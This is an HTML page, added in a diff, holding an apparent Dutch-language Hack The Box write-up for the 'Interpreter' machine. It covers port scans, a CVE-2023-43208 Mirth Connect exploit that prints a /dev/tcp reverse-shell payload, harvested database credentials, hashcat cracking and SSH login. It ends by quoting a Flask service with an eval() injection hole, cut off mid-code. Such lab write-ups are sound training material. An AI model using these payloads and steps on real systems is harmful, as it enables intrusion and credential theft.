@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~] └──╼ [★]$ nmap 10.129.3.19 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-23 01:42 CST Nmap scan report for 10.129.3.19 Host is up (0.0083s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-interpreter/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~] └──╼ [★]$ nmap 10.129.3.19 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-23 01:42 CST Nmap scan report for 10.129.3.19 Host is up (0.0083s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+  <meta itemprop="wordCount" content="1518">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~] └──╼ [★]$ nmap 10.129.3.19 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-23 01:42 CST Nmap scan report for 10.129.3.19 Host is up (0.0083s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-interpreter/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~]
+└──╼ [★]$ nmap 10.129.3.19
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-23 01:42 CST
+Nmap scan report for 10.129.3.19
+Host is up (0.0083s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the services which are open on the ip address.</p>
+<pre tabindex="0"><code>┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~]
+└──╼ [★]$ nmap -p22,80,443 -sCV 10.129.3.19
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-23 01:43 CST
+Nmap scan report for 10.129.3.19
+Host is up (0.0076s latency).
+
+PORT    STATE SERVICE   VERSION
+22/tcp  open  ssh       OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
+|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
+80/tcp  open  http
+|_http-title: Mirth Connect Administrator
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 458
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html;charset=ISO-8859-1&#34;/&gt;
+|     &lt;title&gt;Error 404 Not Found&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;&lt;h2&gt;HTTP ERROR 404 Not Found&lt;/h2&gt;
+|     &lt;table&gt;
+|     &lt;tr&gt;&lt;th&gt;URI:&lt;/th&gt;&lt;td&gt;/nice%20ports%2C/Tri%6Eity.txt%2ebak&lt;/td&gt;&lt;/tr&gt;
+|     &lt;tr&gt;&lt;th&gt;STATUS:&lt;/th&gt;&lt;td&gt;404&lt;/td&gt;&lt;/tr&gt;
+|     &lt;tr&gt;&lt;th&gt;MESSAGE:&lt;/th&gt;&lt;td&gt;Not Found&lt;/td&gt;&lt;/tr&gt;
+|     &lt;tr&gt;&lt;th&gt;SERVLET:&lt;/th&gt;&lt;td&gt;org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-566528e5&lt;/td&gt;&lt;/tr&gt;
+|     &lt;/table&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 23 Feb 2026 07:43:13 GMT
+|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 2532
+|     &lt;!doctype html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
+|     &lt;meta http-equiv=&#34;x-ua-compatible&#34; content=&#34;IE=edge&#34;&gt;
+|     &lt;meta http-equiv=&#34;cache-control&#34; content=&#34;no-cache&#34;&gt;
+|     &lt;meta http-equiv=&#34;cache-control&#34; content=&#34;no-store&#34;&gt;
+|     &lt;title&gt;Mirth Connect Administrator&lt;/title&gt;
+|     &lt;link rel=&#34;shortcut icon&#34; type=&#34;image/x-icon&#34; href=&#34;images/NG_MC_Icon_16x16.png&#34; /&gt;
+|     &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/bootstrap.css&#34; /&gt;
+|     &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/main.css&#34; /&gt;
+|     &lt;script type=&#34;text/javascript&#34;&gt;
+|     Break out of frame if inside a frame. */
+|     (window != window.top) {
+|     window.top.location = window.location;
+|     &lt;/script&gt;
+|     &lt;script type=&#34;text/javascript&#34; sr
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 23 Feb 2026 07:43:13 GMT
+|     Allow: GET, HEAD, TRACE, OPTIONS
+|   RTSPRequest: 
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+|   X11Probe: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
+| http-methods: 
+|_  Potentially risky methods: TRACE
+443/tcp open  ssl/https
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Mirth Connect Administrator
+| ssl-cert: Subject: commonName=mirth-connect
+| Not valid before: 2025-09-19T12:50:05
+|_Not valid after:  2075-09-19T12:50:05
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 458
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html;charset=ISO-8859-1&#34;/&gt;
+|     &lt;title&gt;Error 404 Not Found&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;&lt;h2&gt;HTTP ERROR 404 Not Found&lt;/h2&gt;
+|     &lt;table&gt;
+|     &lt;tr&gt;&lt;th&gt;URI:&lt;/th&gt;&lt;td&gt;/nice%20ports%2C/Tri%6Eity.txt%2ebak&lt;/td&gt;&lt;/tr&gt;
+|     &lt;tr&gt;&lt;th&gt;STATUS:&lt;/th&gt;&lt;td&gt;404&lt;/td&gt;&lt;/tr&gt;
+|     &lt;tr&gt;&lt;th&gt;MESSAGE:&lt;/th&gt;&lt;td&gt;Not Found&lt;/td&gt;&lt;/tr&gt;
+|     &lt;tr&gt;&lt;th&gt;SERVLET:&lt;/th&gt;&lt;td&gt;org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-566528e5&lt;/td&gt;&lt;/tr&gt;
+|     &lt;/table&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 23 Feb 2026 07:43:19 GMT
+|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 2532
+|     &lt;!doctype html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
+|     &lt;meta http-equiv=&#34;x-ua-compatible&#34; content=&#34;IE=edge&#34;&gt;
+|     &lt;meta http-equiv=&#34;cache-control&#34; content=&#34;no-cache&#34;&gt;
+|     &lt;meta http-equiv=&#34;cache-control&#34; content=&#34;no-store&#34;&gt;
+|     &lt;title&gt;Mirth Connect Administrator&lt;/title&gt;
+|     &lt;link rel=&#34;shortcut icon&#34; type=&#34;image/x-icon&#34; href=&#34;images/NG_MC_Icon_16x16.png&#34; /&gt;
+|     &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/bootstrap.css&#34; /&gt;
+|     &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/main.css&#34; /&gt;
+|     &lt;script type=&#34;text/javascript&#34;&gt;
+|     Break out of frame if inside a frame. */
+|     (window != window.top) {
+|     window.top.location = window.location;
+|     &lt;/script&gt;
+|     &lt;script type=&#34;text/javascript&#34; sr
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 23 Feb 2026 07:43:20 GMT
+|_    Allow: GET, HEAD, TRACE, OPTIONS
+|_ssl-date: TLS randomness does not represent time
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.94SVN%I=7%D=2/23%Time=699C0512%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,A8F,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2023\x20Feb\x20
+SF:2026\x2007:43:13\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x202023\
+SF:x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
+SF:ytes\r\nContent-Length:\x202532\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html&gt;\n&lt;hea
+SF:d&gt;\n\t&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;\x20c
+SF:harset=UTF-8\&#34;&gt;\n\t&lt;meta\x20http-equiv=\&#34;x-ua-compatible\&#34;\x20content=\
+SF:&#34;IE=edge\&#34;&gt;\n\t&lt;meta\x20http-equiv=\&#34;cache-control\&#34;\x20content=\&#34;no-ca
+SF:che\&#34;&gt;\n\t&lt;meta\x20http-equiv=\&#34;cache-control\&#34;\x20content=\&#34;no-store\&#34;
+SF:&gt;\n\t\n\t&lt;title&gt;Mirth\x20Connect\x20Administrator&lt;/title&gt;\n\t\n\t&lt;link\
+SF:x20rel=\&#34;shortcut\x20icon\&#34;\x20type=\&#34;image/x-icon\&#34;\x20href=\&#34;images/N
+SF:G_MC_Icon_16x16\.png\&#34;\x20/&gt;\n\t&lt;link\x20rel=\&#34;stylesheet\&#34;\x20type=\&#34;t
+SF:ext/css\&#34;\x20href=\&#34;css/bootstrap\.css\&#34;\x20/&gt;\n\t&lt;link\x20rel=\&#34;styles
+SF:heet\&#34;\x20type=\&#34;text/css\&#34;\x20href=\&#34;css/main\.css\&#34;\x20/&gt;\n\t\n\t&lt;scr
+SF:ipt\x20type=\&#34;text/javascript\&#34;&gt;\n\t\t/\*\x20Break\x20out\x20of\x20fram
+SF:e\x20if\x20inside\x20a\x20frame\.\x20\*/\n\t\tif\x20\(window\x20!=\x20w
+SF:indow\.top\)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.location
+SF:;\n\t\t}\n\t&lt;/script&gt;\n\n\t&lt;script\x20type=\&#34;text/javascript\&#34;\x20sr&#34;)%
+SF:r(HTTPOptions,5A,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2023\x20Feb\
+SF:x202026\x2007:43:13\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\x20OPTI
+SF:ONS\r\n\r\n&#34;)%r(RTSPRequest,AD,&#34;HTTP/1\.1\x20505\x20Unknown\x20Version\
+SF:r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20
+SF:58\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20505&lt;/h1&gt;&lt;pre&gt;re
+SF:ason:\x20Unknown\x20Version&lt;/pre&gt;&#34;)%r(X11Probe,C3,&#34;HTTP/1\.1\x20400\x20
+SF:Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=
+SF:iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;
+SF:Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=
+SF:0x0&lt;/pre&gt;&#34;)%r(FourOhFourRequest,257,&#34;HTTP/1\.1\x20404\x20Not\x20Found\r
+SF:\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nContent-Type:\
+SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\r\n&lt;html&gt;
+SF:\n&lt;head&gt;\n&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;c
+SF:harset=ISO-8859-1\&#34;/&gt;\n&lt;title&gt;Error\x20404\x20Not\x20Found&lt;/title&gt;\n&lt;/h
+SF:ead&gt;\n&lt;body&gt;&lt;h2&gt;HTTP\x20ERROR\x20404\x20Not\x20Found&lt;/h2&gt;\n&lt;table&gt;\n&lt;tr
+SF:&gt;&lt;th&gt;URI:&lt;/th&gt;&lt;td&gt;/nice%20ports%2C/Tri%6Eity\.txt%2ebak&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;
+SF:&lt;th&gt;STATUS:&lt;/th&gt;&lt;td&gt;404&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;th&gt;MESSAGE:&lt;/th&gt;&lt;td&gt;Not\x20Foun
+SF:d&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;th&gt;SERVLET:&lt;/th&gt;&lt;td&gt;org\.eclipse\.jetty\.servlet\.Ser
+SF:vletHandler\$Default404Servlet-566528e5&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;\n\n&lt;/body&gt;\
+SF:n&lt;/html&gt;\n&#34;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port443-TCP:V=7.94SVN%T=SSL%I=7%D=2/23%Time=699C0518%P=x86_64-pc-linux-
+SF:gnu%r(GetRequest,A8F,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2023\x20
+SF:Feb\x202026\x2007:43:19\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x
+SF:202023\x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Range
+SF:s:\x20bytes\r\nContent-Length:\x202532\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html
+SF:&gt;\n&lt;head&gt;\n\t&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;text/htm
+SF:l;\x20charset=UTF-8\&#34;&gt;\n\t&lt;meta\x20http-equiv=\&#34;x-ua-compatible\&#34;\x20co
+SF:ntent=\&#34;IE=edge\&#34;&gt;\n\t&lt;meta\x20http-equiv=\&#34;cache-control\&#34;\x20content=
+SF:\&#34;no-cache\&#34;&gt;\n\t&lt;meta\x20http-equiv=\&#34;cache-control\&#34;\x20content=\&#34;no-
+SF:store\&#34;&gt;\n\t\n\t&lt;title&gt;Mirth\x20Connect\x20Administrator&lt;/title&gt;\n\t\n\
+SF:t&lt;link\x20rel=\&#34;shortcut\x20icon\&#34;\x20type=\&#34;image/x-icon\&#34;\x20href=\&#34;i
+SF:mages/NG_MC_Icon_16x16\.png\&#34;\x20/&gt;\n\t&lt;link\x20rel=\&#34;stylesheet\&#34;\x20t
+SF:ype=\&#34;text/css\&#34;\x20href=\&#34;css/bootstrap\.css\&#34;\x20/&gt;\n\t&lt;link\x20rel=\
+SF:&#34;stylesheet\&#34;\x20type=\&#34;text/css\&#34;\x20href=\&#34;css/main\.css\&#34;\x20/&gt;\n\t\
+SF:n\t&lt;script\x20type=\&#34;text/javascript\&#34;&gt;\n\t\t/\*\x20Break\x20out\x20of\
+SF:x20frame\x20if\x20inside\x20a\x20frame\.\x20\*/\n\t\tif\x20\(window\x20
+SF:!=\x20window\.top\)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.l
+SF:ocation;\n\t\t}\n\t&lt;/script&gt;\n\n\t&lt;script\x20type=\&#34;text/javascript\&#34;\x
+SF:20sr&#34;)%r(HTTPOptions,5A,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2023\
+SF:x20Feb\x202026\x2007:43:20\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\
+SF:x20OPTIONS\r\n\r\n&#34;)%r(FourOhFourRequest,257,&#34;HTTP/1\.1\x20404\x20Not\x
+SF:20Found\r\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nConte
+SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\
+SF:r\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;te
+SF:xt/html;charset=ISO-8859-1\&#34;/&gt;\n&lt;title&gt;Error\x20404\x20Not\x20Found&lt;/ti
+SF:tle&gt;\n&lt;/head&gt;\n&lt;body&gt;&lt;h2&gt;HTTP\x20ERROR\x20404\x20Not\x20Found&lt;/h2&gt;\n&lt;ta
+SF:ble&gt;\n&lt;tr&gt;&lt;th&gt;URI:&lt;/th&gt;&lt;td&gt;/nice%20ports%2C/Tri%6Eity\.txt%2ebak&lt;/td&gt;&lt;/
+SF:tr&gt;\n&lt;tr&gt;&lt;th&gt;STATUS:&lt;/th&gt;&lt;td&gt;404&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;th&gt;MESSAGE:&lt;/th&gt;&lt;td&gt;No
+SF:t\x20Found&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;th&gt;SERVLET:&lt;/th&gt;&lt;td&gt;org\.eclipse\.jetty\.ser
+SF:vlet\.ServletHandler\$Default404Servlet-566528e5&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;\n\
+SF:n&lt;/body&gt;\n&lt;/html&gt;\n&#34;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Ik ben naar de url geweest en daar kom je op de volgende pagina terecht.</p>
+<p>![[Pasted image 20260223084747.png]]</p>
+<p>Zoals je daar kan zien kan je de admin launcher downloaden. Maar zoals je zelf zult kunnen zien is er niet veel dat je daar kunt vinden. Als je op de launch mirth Connect Administrator gaat klikken, krijg je het volgende document te zien.</p>
+<p>![[Pasted image 20260223095923.png]]</p>
+<p>Daar kan je zien dat mirth admin launcher op versie 4.4.0 draait. Ik ben hiervoor een exploit gaan zoeken en hiervoor heb ik de volgende exploit gevonden. <a href="https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT">https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT</a></p>
+<p>Ik ben de exploit gaan uitvoeren en daar kan je zien dat we een connectie met de server krijgen.</p>
+<pre tabindex="0"><code>┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~/CVE-2023-43208-EXPLOIT]
+└──╼ [★]$ python3 CVE-2023-43208.py -u https://interpreter.htb -lh 10.10.15.188 -lp 4444
+//
+[*] Looking for Mirth Connect instance...
+[+] Found Mirth Connect instance
+[+] Vulnerable Mirth Connect version 4.4.0 instance found at https://interpreter.htb
+[!] sh -c $@|sh . echo bash -c &#39;0&lt;&amp;53-;exec 53&lt;&gt;/dev/tcp/10.10.15.188/4444;sh &lt;&amp;53 &gt;&amp;53 
+2&gt;&amp;53&#39;
+[*] Launching exploit against https://interpreter.htb...
+
+┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~]
+└──╼ [★]$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.188] from (UNKNOWN) [10.129.3.19] 43296
+</code></pre><p>Ik ben binnen de connectie gaan zoeken en heb ik een username en een password in het volgende document gevonden.</p>
+<pre tabindex="0"><code>mirth@interpreter:/usr/local/mirthconnect/conf$ cat mirth.properties
+# database credentials
+database.username = mirthdb
+database.password = MirthPass123!
+
+# keystore
+keystore.path = ${dir.appdata}/keystore.jks
+keystore.storepass = 5GbU5HGTOOgE
+keystore.keypass = tAuJfQeXdnPw
+keystore.type = JCEKS
+mys
+
+database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
+</code></pre><pre tabindex="0"><code>MariaDB [mc_bdd_prod]&gt; SELECT * FROM PERSON;
+SELECT * FROM PERSON;
+
+|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             |           | NULL | United States | NULL           |          
+
+MariaDB [mc_bdd_prod]&gt; SELECT * FROM PERSON_PASSWORD
+SELECT * FROM PERSON_PASSWORD
+
+| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
++-----------+----------------------------------------------------------+---------------------+
+|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+</code></pre><p>Hier kan je dus zien dat er een sha256:600000 hash gevonden is. Ik zal dus aan de hand van het volgende commando de hash gaan proberen cracken. Hieraan kan je zien dat het password van sedric gevonden is.</p>
+<pre tabindex="0"><code>┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~/CVE-2023-43208-EXPLOIT]
+└──╼ [★]$ cat hash.txt 
+sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
+
+┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~/CVE-2023-43└──╼ [★]$ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt                 importhashcat (v6.2.6) starting
+
+//
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
+</code></pre><p>Ik zal nu gaan inloggen opm de ssh server.</p>
+<pre tabindex="0"><code>┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~]
+└──╼ [★]$ ssh sedric@interpreter.htb
+The authenticity of host &#39;interpreter.htb (10.129.3.19)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:Oz7Fk6YvrB8/5uSyuoY+mqLefkwpPaepkXAppxIX0xk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;interpreter.htb&#39; (ED25519) to the list of known hosts.
+sedric@interpreter.htb&#39;s password: 
+Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Feb 23 05:08:44 2026 from 10.10.15.188
+sedric@interpreter:~$
+</code></pre><p>Nu kan je het user.txt bestand vinden</p>
+<pre tabindex="0"><code>sedric@interpreter:~$ cat user.txt 
+1216ebd8f2675ea4fa942e7f5a658f97
+</code></pre><p>Python eval() Injection</p>
+<p>dit door gebruik te maken het volgende script</p>
+<pre tabindex="0"><code>cat notif.py
+#!/usr/bin/env python3
+&#34;&#34;&#34;
+Notification server for added patients.
+This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
+It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
+It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
+&#34;&#34;&#34;
+from flask import Flask, request, abort
+import re
+import uuid
+from datetime import datetime
+import xml.etree.ElementTree as ET, os
+
+app = Flask(__name__)
+USER_DIR = &#34;/var/secure-health/patients/&#34;; os.makedirs(USER_DIR, exist_ok=True)
+
+def template(first, last, sender, ts, dob, gender):
+    pattern = re.compile(r&#34;^[a-zA-Z0-9._&#39;\&#34;(){}=+/]+$&#34;)
+    for s in [first, last, sender, ts, dob, gender]:
+        if not pattern.fullmatch(s):
+            return &#34;[INVALID_INPUT]&#34;
+    # DOB format is DD/MM/YYYY
+    try:
+        year_of_birth = int(dob.split(&#39;/&#39;)[-1])
+        if year_of_birth &lt; 1900 or year_of_birth &gt; datetime.now().year:
+            return &#34;[INVALID_DOB]&#34;
+    except:
+        return &#34;[INVALID_DOB]&#34;
+    template = f&#34;Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}&#34;
+    try:
+        return eval(f&#34;f&#39;&#39;&#39;{template}&#39;&#39;&#39;&#34;)
+    except Exception as e:
+        return f&#34;[EVAL_ERROR] {e}&#34;
+
+@app.route(&#34;/addPatient&#34;, methods=[&#34;POST&#34;])
+def receive():
+    if request.remote_addr != &#34;127.0.0.1&#34;:
+        abort(403)
+    try:
+        xml_text = request.data.decode()
+        xml_root = ET.fromstring(xml_text)
+    except ET.ParseError:
